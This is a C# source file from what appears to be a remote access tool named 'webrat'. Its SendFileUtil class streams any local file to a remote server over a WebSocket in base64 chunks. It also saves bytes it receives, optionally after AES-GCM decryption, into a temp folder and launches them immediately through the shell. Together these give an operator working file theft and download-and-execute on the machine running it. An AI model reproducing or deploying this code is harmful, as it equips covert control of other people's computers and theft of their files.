using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Net.WebSockets;
using System.Threading;
using System.Threading.Tasks;
using WebratCs.Common;

namespace WebratCs.Sendfile
{
    public static class SendFileUtil
    {
        public static async Task UploadFileWS(ClientWebSocket ws, string secret, string name, string path, int chunkSize)
        {
            if (ws == null || ws.State != WebSocketState.Open) return;
            if (string.IsNullOrEmpty(path) || !File.Exists(path)) return;
            using (var fs = File.OpenRead(path))
            {
                int seq = 0;
                byte[] buf = new byte[Math.Max(1024, chunkSize)];
                while (true)
                {
                    int n = await fs.ReadAsync(buf, 0, buf.Length);
                    if (n <= 0) break;
                    byte[] chunk = buf;
                    if (n != buf.Length)
                    {
                        chunk = new byte[n];
                        Buffer.BlockCopy(buf, 0, chunk, 0, n);
                    }
                    var b64 = Convert.ToBase64String(chunk);
                    var msg = "{\"type\":\"file\",\"name\":\"" + EscapeJson(name) + "\",\"seq\":" + seq + ",\"eof\":false," +
                        "\"b64\":\"" + b64 + "\"," +
                        "\"ts\":\"" + DateTime.UtcNow.ToString("O") + "\"}";
                    var data = Encoding.UTF8.GetBytes(msg);
                    await ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None);
                    seq++;
                }
                var eofMsg = "{\"type\":\"file\",\"name\":\"" + EscapeJson(name) + "\",\"seq\":" + seq + ",\"eof\":true,\"ts\":\"" + DateTime.UtcNow.ToString("O") + "\"}";
                var eofData = Encoding.UTF8.GetBytes(eofMsg);
                await ws.SendAsync(new ArraySegment<byte>(eofData), WebSocketMessageType.Text, true, CancellationToken.None);
            }
        }

        public static bool OpenLocalFile(string path)
        {
            try
            {
                var psi = new ProcessStartInfo(path);
                psi.UseShellExecute = true;
                Process.Start(psi);
                return true;
            }
            catch { return false; }
        }

        public static string SaveAndOpen(byte[] data, string fileName)
        {
            var dir = Path.Combine(Path.GetTempPath(), "webrat-files");
            Directory.CreateDirectory(dir);
            var safe = MakeSafeFileName(fileName);
            if (string.IsNullOrEmpty(safe)) safe = "file.bin";
            var p = Path.Combine(dir, safe);
            File.WriteAllBytes(p, data ?? new byte[0]);
            OpenLocalFile(p);
            return p;
        }

        public static string SaveAndOpenEncrypted(byte[] iv, byte[] tag, byte[] ct, string secret, string fileName)
        {
            var plain = Crypto.DecryptAesGcm(ct, iv, tag, secret);
            return SaveAndOpen(plain, fileName);
        }

        private static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string MakeSafeFileName(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            foreach (var ch in Path.GetInvalidFileNameChars())
            {
                s = s.Replace(ch, '_');
            }
            return s;
        }
    }
}
